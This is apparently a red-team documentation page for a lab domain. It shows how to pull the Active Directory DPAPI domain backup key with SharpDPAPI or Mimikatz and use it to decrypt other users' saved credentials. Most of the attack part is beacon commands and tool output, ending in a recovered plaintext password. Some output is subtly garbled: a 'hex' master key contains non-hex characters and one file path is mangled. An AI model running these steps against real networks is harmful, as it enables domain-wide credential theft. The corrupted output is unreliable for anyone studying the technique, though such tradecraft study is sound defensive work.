---
title: "DPAPI Domain Backup Key Extraction"
date: 2026-09-25
weight: 2
type: docs
tags:
  - Active Directory
  - Domain Dominance
---

The Data Protection API (DPAPI) handles the protection of user-specific storage assets across the Windows architecture. Secrets like those within the Windows Credential Manager rely on symmetric master keys derived from the owner's active password hash. If an administrator resets a user's password, the original key calculation fails, rendering the old storage structure inaccessible. 

To prevent data loss, the operating system wraps a secondary copy of the user's master key in an envelope encrypted by a domain-wide public key. Exposing this root asset allows operators to reconstruct structural keys and unlock protected storage profiles for any identity across the network.

## Harvesting the Enterprise Backup Key

The central domain backup key is generated during the baseline build of an Active Directory forest. Similar to the `krbtgt` account hash, this secret never automatically rolls over, but unlike the `krbtgt` object, Microsoft provides no native administrative utility to rotate it. A Domain Administrator can query a Domain Controller to extract the private key material using the BackupKey Remote Protocol (MS-BKRP).

This extraction routine is automated via the `lsadump::backupkeys` block in Mimikatz, as well as the `backupkey` module within SharpDPAPI.

```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe backupkey

[*] Action: Retrieve domain DPAPI backup key

[*] Using current domain controller  : dc-1.arcadia.local
[*] Preferred backupkey Guid         : 12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Full preferred backupKeyName     : G$BCKUPKEY_12c95677-bb3d-4932-aab9-1e89c1dd005d
[*] Key                              : ArC4D1a[...snip...]mZ0ne8=
```

## Cross-Session Offline Vault Decryption

When an operator holds administrative control over a target system, they can audit stored DPAPI assets belonging to other user profiles on that endpoint. In the scenario below, an operator running a high-integrity beacon as `t_turner` attempts to inventory saved connection data associated with the profile of `j_doe`.

```powershell
beacon> getuid
[*] You are ARCADIA\t_turner (admin)

beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials

[*] Action: User DPAPI Credential Triage

[*] Triaging Credentials for ALL users

Folder       : C:\Users\j_doe\AppData\Local\Microsoft\Credentials\

  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2

    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
    size             : 396
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    [X] MasterKey GUID not in cache: {120b3a8a-683d-4db8-8f13-e4c466949bd2}
```

Standard automated RPC parsing techniques fail here because `t_turner` lacks authorization to request a security context mapping for `j_doe`'s files from the DC. Instead, the operator can provide the domain's root private key to SharpDPAPI via the `/pvk` parameter to manually unwrap the MasterKey GUID structures without contacting the directory container.

```powershell
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:ArC4D1a[...snip...]mZ0ne8=

[*] Action: User DPAPI Credential Triage

[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!

[*] User master key cache:

{120b3a8a-683d-4db8-8f13-e4c466949bd2}:73EE50CD3DF4111GD0EG4E4C7C59DB843E88GC45

[*] Triaging Credentials for ALL users

Folder       : C:\(\Users\j_doe\AppData\Local\Microsoft\Credentials\\)

  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2

    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
    size             : 396
    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
    description      : Local Credential Data

    LastWritten      : 14/02/2025 14:02:28
    TargetName       : Domain:target=TERMSRV/wkstn-5.arcadia.local
    TargetAlias      : 
    Comment          : 
    UserName         : ARCADIA\local_admin
    Credential       : ArcadiaPass2026!
```
